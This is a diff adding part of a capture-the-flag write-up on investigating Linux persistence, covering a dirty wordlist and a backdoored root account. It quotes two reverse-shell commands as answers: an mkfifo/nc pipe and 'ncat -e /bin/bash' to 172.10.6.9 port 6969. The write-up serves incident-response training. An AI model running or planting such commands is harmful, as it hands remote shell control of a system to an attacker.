@@ -87,3 +87,37 @@ We see one job scheduled, and it's attempting to create a reverse shell to the s
 **Answer:** /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
 
 ### Task 3: Dirty Wordlist Revisited
+
+> A dirty wordlist is essentially raw documentation of the investigation from the investigator's perspective. It may contain everything that would help lead the investigation forward, from actual IOCs to random notes. Keeping a dirty wordlist assures the investigator that a specific IOC has already been recorded, helping keep the investigation on track and preventing getting stuck in a closed loop of used leads. 
+
+This part of the room doesn't have us investigate anything, but instead goes into more detail about the idea of a dirty wordlist to help during investigations.  We're provided a flag in the instructions.
+
+### Task 4: Investigating the root account
+
+> Normal user accounts aren't the only place to leave persistence mechanisms. As such, we will then go ahead and investigate the root account. 
+
+##### A few moments after logging on to the root account, you find an error message in your terminal.  What does it say?
+
+As mentioned, giorgio has root access to the server, so we escalate our privileges with `sudo -s` and receive an odd message:
+
+![Ncat: TIMEOUT.](/assets/img/uploads/sudo-s.png)
+
+**Answer:** Ncat: TIMEOUT.
+
+##### After moving forward with the error message, a suspicious command appears in the terminal as part of the error message.  What command was displayed?
+
+We press enter to continue and are provided another unexpected result:
+
+![](/assets/img/uploads/sudo-s-2.png)
+
+How did that happen? I didn't even do anything -- I just logged as root, and it happened.
+
+**Answer**: ncat -e /bin/bash 172.10.6.9 6969
+
+> You might wonder, "how did that happen? I didn't even do anything? I just logged as root, and it happened."
+
+...yes, quite.
+
+##### Can you find out how the suspicious command has been implemented?
+
+To figure out this situation, we revisit our friend .bashrc, but for the root account this time:
